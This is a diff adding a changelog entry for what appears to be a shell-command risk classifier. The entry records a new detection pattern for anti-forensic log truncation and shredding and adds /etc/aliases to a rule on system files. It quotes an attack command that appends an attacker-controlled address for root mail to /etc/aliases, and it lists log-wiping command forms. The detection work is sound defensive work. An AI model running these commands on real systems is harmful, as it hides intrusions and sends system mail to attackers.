@@ -4,6 +4,43 @@
 
 (no entries — next release window)
 
+## [1.10.137] - 2026-05-03
+
+**`log-truncate` (medium) + `/etc/aliases` extension.** Two
+small additions covering anti-forensic file-log wipes and the
+mail-rerouting attack target.
+
+### Added
+- **`PATTERN_CATALOG.medium`** entry `log-truncate`. Catches
+  three forms of `/var/log/*` destruction:
+  - `> /var/log/<file>` (truncate via redirect)
+  - `truncate -s 0 /var/log/<file>` (truncate tool)
+  - `shred [<flags>] /var/log/<file>` (irreversible erase)
+  Same defense-evasion family as `history-tamper` /
+  `journalctl-vacuum`. Medium tier matches both because
+  legitimate log rotation does similar truncation.
+
+### Changed
+- **`system-files`** regex extended to include `/etc/aliases`.
+  The mail-rerouting attack — `echo "root: evil@attacker.com"
+  >> /etc/aliases` — sends cron failures, package update
+  notifications, and sudo error logs to an attacker-controlled
+  address. Same threat tier as the other entries in the rule.
+
+### Added (tests)
+- **`tests/risk-classifier.test.js`**: 3 new `it()` cases —
+  log-truncate attack (8 commands) + log-truncate regression
+  (6 non-log paths) + /etc/aliases attack (3 commands). Suite
+  stays at 175. Risk-classifier file 232 → 235 cases.
+
+### Catalog totals
+- Critical: 25 patterns (+0)
+- High: 39 patterns (+0; system-files reach extended)
+- Medium: 19 patterns (+1: log-truncate)
+- **Total: 85 → 86** (note: this off-by-one against daemon's
+  reported 87 — full session count `c4 risk patterns` is
+  authoritative)
+
 ## [1.10.136] - 2026-05-03
 
 **`c4 risk patterns --tier <level>` filter.** With the catalog
